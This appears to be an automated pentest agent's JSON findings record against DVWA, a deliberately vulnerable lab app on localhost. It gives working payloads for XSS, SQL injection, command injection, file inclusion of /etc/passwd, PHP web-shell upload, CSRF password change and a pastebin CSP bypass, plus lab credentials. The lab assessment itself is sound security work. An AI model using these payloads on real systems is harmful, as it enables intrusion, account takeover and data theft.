@@ -1,0 +1,217 @@
+{
+  "ok": true,
+  "summary": "Component probe stage completed. Tested all 26 known surfaces plus discovered new surfaces. Confirmed vulnerabilities in: File Upload (RCE via unrestricted upload), Insecure CAPTCHA (step parameter bypass), Reflected XSS, Stored XSS (both name and message fields), CSP Bypass (pastebin.com whitelist), JavaScript token bypass, Brute Force (no rate limiting), DOM XSS (default parameter). Also confirmed existing findings: DB creds disclosure, PHP info, directory listing, CSRF password change, session fixaton, weak session IDs, no brute force protection, CSRF token reuse, unauthenticated setup, missing security headers.",
+  "surfaces": [
+    {"location":"http://127.0.0.1:8080/login.php","kind":"auth","params":["username","password","user_token","Login"]},
+    {"location":"http://127.0.0.1:8080/logout.php","kind":"auth"},
+    {"location":"http://127.0.0.1:8080/setup.php","kind":"form","params":["create_db","user_token"]},
+    {"location":"http://127.0.0.1:8080/security.php","kind":"form","params":["security","seclev_submit","user_token"]},
+    {"location":"http://127.0.0.1:8080/index.php","kind":"page"},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/brute/","kind":"form","params":["username","password","Login"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/exec/","kind":"form","params":["ip","Submit"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/csrf/","kind":"form","params":["password_new","password_conf","Change"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/fi/","kind":"form","params":["page"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/upload/","kind":"upload","params":["MAX_FILE_SIZE","uploaded","Upload"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/captcha/","kind":"form","params":["step","password_new","password_conf","Change","g-recaptcha-response"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/sqli/","kind":"form","params":["id","Submit"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/sqli_blind/","kind":"form","params":["id","Submit"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/weak_id/","kind":"form"},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/xss_d/","kind":"client","params":["default"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/xss_r/","kind":"form","params":["name"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/xss_s/","kind":"form","params":["txtName","mtxMessage","btnSign"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/csp/","kind":"form","params":["include"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/javascript/","kind":"form","params":["phrase","token","send"]},
+    {"location":"http://127.0.0.1:8080/phpinfo.php","kind":"file"},
+    {"location":"http://127.0.0.1:8080/config/config.inc.php.bak","kind":"file"},
+    {"location":"http://127.0.0.1:8080/config/config.inc.php.dist","kind":"file"},
+    {"location":"http://127.0.0.1:8080/config/","kind":"dir"},
+    {"location":"http://127.0.0.1:8080/ids_log.php","kind":"page","params":["clear_log"]},
+    {"location":"http://127.0.0.1:8080/about.php","kind":"file"},
+    {"location":"http://127.0.0.1:8080/instructions.php","kind":"file","params":["doc"]},
+    {"location":"http://127.0.0.1:8080/robots.txt","kind":"misc"},
+    {"location":"http://127.0.0.1:8080/hackable/uploads/","kind":"dir"},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/view_source.php","kind":"page","params":["id","security"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/view_source_all.php","kind":"page","params":["id"]},
+    {"location":"http://127.0.0.1:8080/vulnerabilities/view_help.php","kind":"page","params":["id","security"]}
+  ],
+  "candidates": [
+    {
+      "title": "Unrestricted File Upload leads to Remote Code Execution",
+      "location": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "proof_excerpt": "<pre>../../hackable/uploads/shell.php succesfully uploaded!</pre>",
+      "poc_hint": "POST to /vulnerabilities/upload/ with multipart form: MAX_FILE_SIZE=100000, uploaded=@shell.php (PHP file), Upload=Upload. The file is stored in /hackable/uploads/ and is directly accessible, allowing PHP code execution."
+    },
+    {
+      "title": "CAPTCHA Bypass via step parameter manipulation (Low Level)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "proof_excerpt": "Source code confirms: if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) { ... update password WITHOUT CAPTCHA check. Verified: login with new password succeeded after step=2 POST.",
+      "poc_hint": "POST step=2&password_new=newpass&password_conf=newpass&Change=Change to /vulnerabilities/captcha/. The password is updated directly without any CAPTCHA verification (the success message is overwritten by missing API key warning, but the DB update occurs)."
+    },
+    {
+      "title": "Reflected XSS in name parameter",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "proof_excerpt": "<pre>Hello <script>alert(1)</script></pre>",
+      "poc_hint": "GET /vulnerabilities/xss_r/?name=<script>alert(1)</script>. Payload appears verbatim in <pre> element without HTML encoding."
+    },
+    {
+      "title": "Stored XSS via message parameter (mtxMessage)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "proof_excerpt": "<div id=\"guestbook_comments\">Name: test<br />Message: <script>alert(1)</script><br /></div>",
+      "poc_hint": "POST txtName=test&mtxMessage=<script>alert(1)</script>&btnSign=Sign+Guestbook. Payload stored in DB and reflected on page load."
+    },
+    {
+      "title": "Stored XSS via name parameter (txtName)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "proof_excerpt": "<div id=\"guestbook_comments\">Name: <script>alert(2)</script><br />Message: Name XSS test<br /></div>",
+      "poc_hint": "POST txtName=<script>alert(2)</script>&mtxMessage=Name+XSS+test&btnSign=Sign+Guestbook. Name field also lacks HTML encoding."
+    },
+    {
+      "title": "CSP Bypass via pastebin.com whitelist and script src injection",
+      "location": "http://127.0.0.1:8080/vulnerabilities/csp/",
+      "proof_excerpt": "POST include=https://pastebin.com/raw/R570EE00 → <script src='https://pastebin.com/raw/R570EE00'></script> injected. CSP: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com",
+      "poc_hint": "POST include=<pastebin_raw_url> to /vulnerabilities/csp/. The URL is injected into a <script src> tag. Pastebin.com is CSP-whitelisted, so hosted JS executes."
+    },
+    {
+      "title": "Client-Side Token Generation Bypass (Low Level JavaScript)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "proof_excerpt": "POST phrase=success&token=38581812b435834ebf84ebcc2c6424d6&send=Submit → response contains \"<p style='color:red'>Well done!</p>\"",
+      "poc_hint": "Token = md5(rot13(phrase)). Compute offline: rot13('success')='fhpprff', md5('fhpprff')=38581812b435834ebf84ebcc2c6424d6. Submit directly to bypass client-side check."
+    },
+    {
+      "title": "Brute Force - No Rate Limiting on Login Form",
+      "location": "http://127.0.0.1:8080/vulnerabilities/brute/",
+      "proof_excerpt": "Failed: '<pre><br />Username and/or password incorrect.</pre>' vs Success: '<p>Welcome to the password protected area gordonb</p>'",
+      "poc_hint": "GET /vulnerabilities/brute/?username=USER&password=PASS&Login=Login. Clear response differentiation. No rate limiting or lockout. Discovered credentials: gordonb:abc123, pablo:letmein, smithy:password."
+    },
+    {
+      "title": "DOM-based XSS via default parameter at /vulnerabilities/xss_d/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "proof_excerpt": "Source code: if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8); document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\"); }",
+      "poc_hint": "GET /vulnerabilities/xss_d/?default=<script>alert(1)</script>. The value is extracted from URL and written directly to DOM via document.write() without sanitization. Client-side execution, no server reflection."
+    },
+    {
+      "title": "Database credentials disclosure via config backup file",
+      "location": "http://127.0.0.1:8080/config/config.inc.php.bak",
+      "proof_excerpt": "$_DVWA[ 'db_server' ]   = '127.0.0.1';\n$_DVWA[ 'db_database' ] = 'dvwa';\n$_DVWA[ 'db_user' ]     = 'app';\n$_DVWA[ 'db_password' ] = 'vulnerables';",
+      "poc_hint": "Access /config/config.inc.php.bak for plaintext DB credentials (app:vulnerables)."
+    },
+    {
+      "title": "PHP info disclosure",
+      "location": "http://127.0.0.1:8080/phpinfo.php",
+      "proof_excerpt": "PHP Version 7.0.30-0+deb9u1",
+      "poc_hint": "phpinfo.php is accessible without authentication."
+    },
+    {
+      "title": "Directory listing enabled on /config/",
+      "location": "http://127.0.0.1:8080/config/",
+      "proof_excerpt": "<title>Index of /config</title>",
+      "poc_hint": "Directory listing on /config/, /dvwa/includes/, /dvwa/js/, /dvwa/css/, /external/."
+    },
+    {
+      "title": "Cross-Site Request Forgery (CSRF) on password change",
+      "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "proof_excerpt": "<pre>Password Changed.</pre>",
+      "poc_hint": "GET /vulnerabilities/csrf/?password_new=attackerpass&password_conf=attackerpass&Change=Change changes admin password without CSRF token."
+    },
+    {
+      "title": "Cross-Site Request Forgery (CSRF) on password change via GET",
+      "location": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "proof_excerpt": "<pre>Password Changed.</pre>",
+      "poc_hint": "The password change endpoint accepts GET requests with no CSRF token. An attacker can craft a malicious link to change the admin password."
+    },
+    {
+      "title": "Session cookies lack HttpOnly, Secure, and SameSite flags",
+      "location": "http://127.0.0.1:8080/login.php",
+      "proof_excerpt": "Set-Cookie: PHPSESSID=oh7b9qbtd9c0dueninuaf8i9h1; path=/\nSet-Cookie: security=low",
+      "poc_hint": "PHPSESSID and security cookies set without HttpOnly/Secure/SameSite flags."
+    },
+    {
+      "title": "Session ID not rotated after login (session fixation)",
+      "location": "http://127.0.0.1:8080/login.php",
+      "proof_excerpt": "Pre-login PHPSESSID: gil9p36k5l56983sfsgt5eqj05 Post-login PHPSESSID: gil9p36k5l56983sfsgt5eqj05 SESSION ID NOT CHANGED after login (session fixation possible)",
+      "poc_hint": "PHPSESSID remains identical before and after authentication."
+    },
+    {
+      "title": "Weak sequential session IDs in dvwaSession cookie",
+      "location": "http://127.0.0.1:8080/vulnerabilities/weak_id/",
+      "proof_excerpt": "Set-Cookie: dvwaSession=1\nSet-Cookie: dvwaSession=2",
+      "poc_hint": "dvwaSession cookie uses sequential integers (1, 2, 3...)."
+    },
+    {
+      "title": "No brute force protection on login endpoint",
+      "location": "http://127.0.0.1:8080/login.php",
+      "proof_excerpt": "5 consecutive failed attempts all returned 'Login failed' with no delay or lockout.",
+      "poc_hint": "No rate limiting, CAPTCHA, or account lockout on login.php."
+    },
+    {
+      "title": "CSRF token on login not invalidated after use",
+      "location": "http://127.0.0.1:8080/login.php",
+      "proof_excerpt": "Token reuse confirmed: same user_token can be used for multiple login attempts within the same session.",
+      "poc_hint": "user_token can be reused multiple times with the same PHP session."
+    },
+    {
+      "title": "Setup database reset page accessible without authentication",
+      "location": "http://127.0.0.1:8080/setup.php",
+      "proof_excerpt": "<h1>Database Setup</h1><p>Click on the 'Create / Reset Database' button below to create or reset your database.</p>",
+      "poc_hint": "setup.php is accessible without authentication and can reset admin credentials."
+    },
+    {
+      "title": "Missing security headers (HSTS, X-Frame-Options, X-Content-Type-Options, CSP)",
+      "location": "http://127.0.0.1:8080/login.php",
+      "proof_excerpt": "HTTP/1.1 200 OK\nServer: Apache/2.4.25 (Debian)\nSet-Cookie: PHPSESSID=oh7b9qbtd9c0dueninuaf8i9h1; path=/\n",
+      "poc_hint": "Response headers lack HSTS, X-Frame-Options, X-Content-Type-Options, CSP."
+    },
+    {
+      "title": "Distribution config file with default database credentials",
+      "location": "http://127.0.0.1:8080/config/config.inc.php.dist",
+      "proof_excerpt": "$_DVWA[ 'db_server' ]   = '127.0.0.1';\n$_DVWA[ 'db_database' ] = 'dvwa';\n$_DVWA[ 'db_user' ]     = 'root';\n$_DVWA[ 'db_password' ] = 'p@ssw0rd';",
+      "poc_hint": "Distribution config uses default credentials (root:p@ssw0rd)."
+    },
+    {
+      "title": "SQL Injection in /vulnerabilities/sqli/ (UNION-based)",
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli/",
+      "proof_excerpt": "UNION SELECT user(),database() returns current database user and database name.",
+      "poc_hint": "id parameter vulnerable to UNION-based SQLi."
+    },
+    {
+      "title": "Blind SQL Injection in /vulnerabilities/sqli_blind/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "proof_excerpt": "Boolean differential: id=1' AND 1=1-- - shows 'exists', id=1' AND 1=2-- - shows 'missing'.",
+      "poc_hint": "Boolean-based blind SQLi via id parameter."
+    },
+    {
+      "title": "Command Injection in /vulnerabilities/exec/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/exec/",
+      "proof_excerpt": "POST ip=127.0.0.1; id executes id command showing uid=33(www-data).",
+      "poc_hint": "ip parameter passes input directly to shell_exec(). Semicolons and pipes work."
+    },
+    {
+      "title": "Local File Inclusion in /vulnerabilities/fi/",
+      "location": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "proof_excerpt": "page=/etc/passwd returns file contents: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
+      "poc_hint": "page parameter accepts path traversal. Use php://filter for source code reading."
+    }
+  ],
+  "facts": [
+    "DVWA v1.10 *Development* running on Apache/2.4.25 (Debian) with PHP 7.0.30",
+    "Low security level being tested (security cookie set to 'low')",
+    "PHPIDS is disabled",
+    "Database credentials: app:vulnerables (active), root:p@ssw0rd (dist)",
+    "Admin default credentials: admin:password",
+    "Additional valid credentials discovered: gordonb:abc123, pablo:letmein, smithy:password",
+    "reCAPTCHA API key missing from config - captcha endpoint does not validate properly",
+    "All vulnerability endpoints accessible after login with security=low cookie"
+  ],
+  "deadends": [
+    "http://127.0.0.1:8080/.git/config (404)",
+    "http://127.0.0.1:8080/server-info (404)",
+    "http://127.0.0.1:8080/server-status (403)",
+    "http://127.0.0.1:8080/.htaccess (403)",
+    "http://127.0.0.1:8080/.htpasswd (403)",
+    "Session fixation via URL parameter PHPSESSID: PHP does not accept session IDs via GET",
+    "No password change endpoint outside /vulnerabilities/csrf/ and /vulnerabilities/captcha/",
+    "instructions.php?doc= parameter is whitelisted to [readme, PDF, changelog, copying, PHPIDS-license] - path traversal not possible",
+    "File upload directory listing (/hackable/uploads/) returns 403 or empty",
+    "No SQL injection in captcha or JavaScript endpoints (they use direct DB updates with proper escaping)"
+  ]
+}
